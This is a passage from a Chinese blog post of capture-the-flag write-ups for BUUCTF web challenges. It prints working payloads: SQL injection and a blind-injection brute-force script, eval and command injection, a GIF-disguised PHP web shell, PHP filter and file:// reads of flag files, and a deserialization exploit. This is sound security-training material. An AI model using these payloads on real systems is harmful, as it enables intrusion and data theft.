class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>总结一下可以查看文件的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat   tac   nl   more    less    head    tail    od</span><br><span class="line">sort    grep    cut</span><br></pre></td></tr></table></figure>
<p><a href='https://blog.csdn.net/ChenZIDu/article/details/103937649?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task' target='_blank' rel="noopener noreferrer">GXYCTF2019WP<br><a href='https://blog.csdn.net/qq_42812036/article/details/104297163' target='_blank' rel="noopener noreferrer">[GXYCTF2019]Ping Ping Ping {命令执行总结}</a></p>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>单引号报错界面查看源代码，可以看到html注释，base32之后base64会给出<code>$sql</code>查询语句，如果输入的用户名不是admin会回显wrong user，是则回显wrong pass，那么一定有admin这个用户，下面是github上的部分源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable">$arr</span> = mysqli_fetch_row(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$password</span>) == <span class="variable">$arr</span>[<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;wrong pass!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>知道源码之后可以再username处进行注入，通过order by（注意or被过滤，可以大写绕过）判断出有三列，可以通过联合查询返回自己要的结果，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;a&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
<p>union select使得返回的结果为一行内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 | admin | c4ca4238a0b923820dcc509a6f75849b    //&#x27;1&#x27;的md5值</span><br></pre></td></tr></table></figure>
<p>那么和<code>md5($password)</code>比较之后就会通过判断，然后就有flag了</p>
<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>看到?no=1，本能地想到sql注入，测试了一下一共四列，第二列可以正常回显，整型注入，不用闭合，直接<code>union select</code>会被过滤，但是<code>union/**/select</code>可以绕过，可能是过滤的正则表达式有问题，但是搞了半天啥也没有，只有一个fakebook数据库，一个users表<br>列名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="keyword">no</span>,username,passwd,<span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">//返回正常页面，和?<span class="keyword">no</span>=<span class="number">1</span>一样</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">？no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="string">&#x27;~&#x27;</span>,<span class="keyword">no</span>,username,passwd,<span class="keyword">data</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">回显：//方便观察，已经分开了</span><br><span class="line"><span class="keyword">no</span>-&gt; <span class="number">1</span></span><br><span class="line">username-&gt; aa</span><br><span class="line">passwd-&gt; cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e1</span><br><span class="line">data-&gt; O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;aa&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:6:&quot;aa.com&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>然后看源代码时看到iframe标签，就想到可能是ssrf（然而只是听过这个攻击方法，并不知道怎么应用），于是乎又是日常搜题解</p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/11900128.html" target='_blank' rel="noopener noreferrer">Fakebook</a></p>
<p><a href='https://www.cnblogs.com/s0ky1xd/p/5859049.html' target='_blank' rel="noopener noreferrer">浅谈ssrf漏洞</a></p>
<p>ssrf漏洞：服务器端请求伪造，使服务器发起请求，可以访问到外网访问不到的资源，比如内网的机密文件等</p>
<p>这一题还需要扫描目录，以后得注意了，做题没事就扫一下2333，可以扫描到存在<code>robots.txt</code>和<code>flag.php</code>，但是直接访问<code>flag.php</code>是没有任何内容的，从<code>robots.txt</code>中可以知道还有<code>user.php.bak</code>备份文件，下载下来进行代码审计</p>
<p>看了大佬的题解，意思是数据库中存的<code>data</code>是反序列化后的用户信息，那么注册的时候有过滤，这时候就可以通过查询语句来绕过，去得到<code>flag.hph</code>的内容，构造payload;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;aa&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
<p>然后可以在源代码中找到blog内容中有base64编码之后的<code>flag.php</code>的代码</p>
<h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>因为没有屏蔽<code>load_file()</code>函数，所以可以在sql语句中读取文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=2 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>),<span class="number">5</span>),<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>用<code>substr()</code>函数可以将文件前几个字符去掉，避免识别为php代码，但是测试了一下，不用<code>substr()</code>也可以在源代码中看到flag</p>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>打卡靶机之后是一个简单计算器，查看源代码可以看到是向<code>calc.php</code>传递参数来进行计算，访问<code>calc.php</code>得到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到是通过<code>eval()</code>函数来进行的计算，但是有waf，于是乎，日常搜题解</p>
<p><a href='https://blog.csdn.net/weixin_44077544/article/details/102630714' target='_blank' rel="noopener noreferrer">[RoarCTF 2019]Easy Calc</a><br><a href='https://blog.csdn.net/a3320315/article/details/102937797' target='_blank' rel="noopener noreferrer">[RoarCTF 2019]Easy Calc(http走私 &amp;&amp; 利用PHP的字符串解析特性Bypass)</a></p>
<p>对于这一题讲，貌似waf并不是仅仅有php代码中那一个，因为传递某些参数还会出现404或者500，可以利用php的字符串解析特性，传递参数<code>&#39; num&#39;</code>，php在识别时会自动去掉空白字符或者添加下划线，于是我们传递参数<code>&#39; num&#39;</code>，不会被waf识别，但是却可以在php代码中执行，然后再考虑绕过php中的waf，屏蔽了很多关键字符，可以用<code>chr()</code>函数绕过</p>
<p>使用<code>scandir()</code>扫描目录，<code>var_dump()</code>来讲返回的数组输出，payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>))</span><br><span class="line">回显：</span><br><span class="line"><span class="keyword">array</span>(<span class="number">24</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;.dockerenv&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;bin&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;boot&quot;</span> [<span class="number">5</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;dev&quot;</span> [<span class="number">6</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;etc&quot;</span> [<span class="number">7</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;f1agg&quot;</span><span class="comment">//此处省略一堆</span></span><br></pre></td></tr></table></figure>
<p>看到有文件<code>f1agg</code>，然后可以用<code>file_get_contents()</code>函数读取文件内容，还是用<code>chr()</code>函数绕过过滤，payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
<p>参考：<br><a href='https://www.freebuf.com/articles/web/213359.html' target='_blank' rel="noopener noreferrer">利用PHP的字符串解析特性Bypass</a><br><a href='https://xz.aliyun.com/t/6654' target='_blank' rel="noopener noreferrer">从一道题到协议层攻击之HTTP请求走私</a></p>
<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>右键查看源代码，看到有注释提示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    <span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>get方法传递参数<code>?cat=dog</code></p>
<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>算是签到吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;fliter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7N2Y3ZmUzZGUtMDhlMC00NzVkLWEzYzctMDkzZGY4NTA1NDc1fQo&#x3D;</span><br></pre></td></tr></table></figure>
<p><a href='https://blog.csdn.net/nzjdsds/article/details/82461043' target='_blank' rel="noopener noreferrer">PHP伪协议总结</a></p>
<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>白给的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post data:</span><br><span class="line">Syc&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>源码泄露+反序列化漏洞</p>
<p>首先是get到<code>www.zip</code>然后解压后得到源码，发现index中有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结合class.php中的代码以及php的反序列化漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>参考以前写过的一篇blog：<br><a href='/archives/488'>PHP反序列化漏洞</a></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>http头相关知识，抓包可以发现隐藏的链接，链接到<code>Secret.php</code>，然后修改相应http头即可</p>
<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>pthml绕过文件名检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($REQUEST[shell])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>绕过<code>&lt;?</code>检测</p>
<p>没想到的是还有<code>upload</code>路径问题。</p>
<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>数字型注入，而且没有过滤掉函数，手动fuzz一下可以用<code>if()</code>函数盲注，没有过滤<code>select</code>或者<code>from</code>等关键词，但是只要一用<code>select flag from flag</code>就会报<code>sql injection</code>，而且也过滤了<code>/**/</code>，不知道为啥，后来想到会不会只正则匹配，然后误打误撞发现换行竟然可以绕过检测，后来看了源码才知道原来是过滤了空格。我是用换行绕过了，另外还可以用括号绕过，同样不会出现空格，如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag)</span><br></pre></td></tr></table></figure>

<p>没有写二分法，<del>真男人</del>（懒狗）从来都是直接爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://48fee26c-e35d-461b-ad08-91ff24f3c0f4.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    word_i = <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">        word_num = <span class="built_in">str</span>(num)</span><br><span class="line">        payload = <span class="string">&#x27;if(ascii(right(left((\nselect\nflag\nfrom\nflag),%s),1))=%s,1,2)&#x27;</span> % (word_i, word_num)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            ans += <span class="built_in">chr</span>(num)</span><br><span class="line">            print(ans)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>先是get下载<code>index.php.bak</code>，然后分析代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传递的参数必须为数字，网上有些说<code>is_numeric()</code>函数还能判断十六进制，但是我尝试了一下只能是十进制，不知道为啥，然后<code>$key</code>被转换为数字和<code>$str</code>比较相等即得flag，强制类型转换<code>?key=123</code>即可</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1582612801@qq.com">R4in1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://r4in1.github.io/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">https://r4in1.github.io/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://r4in1.github.io" target="_blank">R4in1's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/02/%E8%AE%B0BJDCTF-on-BUUOJ/"><img class="prev-cover" src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">记BJDCTF on BUUOJ</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/02/SQL-libs-1-N/"><img class="next-cover" src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQL-libs 1-?</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/R4in1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">R4in1</div><div class="author-info__description">Life has a beautiful, crazy design.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/R4in1"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二种</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 